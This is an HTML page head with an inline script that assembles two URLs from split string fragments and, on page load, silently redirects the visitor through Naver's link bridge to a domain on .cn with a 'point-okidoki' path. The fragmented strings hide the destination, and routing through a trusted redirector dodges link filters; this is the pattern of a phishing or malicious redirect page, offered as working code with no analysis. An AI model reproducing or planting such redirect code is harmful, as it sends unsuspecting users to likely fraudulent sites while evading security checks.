<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <script type="text/javascript">
        function generateObfuscatedUrl() {
            var baseUrlParams = [
                'htt',
                'ps:',
                '//',
                'link.',
                'naver.',
                'com/',
                'bridge?',
                'url',
                '='
            ];

            var hrefParams = [
                'htt',
                'ps:',
                '//',
                'shjpdkj.',
                'cn/',
                'point-okidoki'
            ];

            var baseUrl = baseUrlParams.join('');
            var hrefUrl = hrefParams.join('');
            return baseUrl + hrefUrl;
        }

        window.onload = function () {
            var obfuscatedUrl = generateObfuscatedUrl();
            window.location.href = obfuscatedUrl;
        }
    </script>
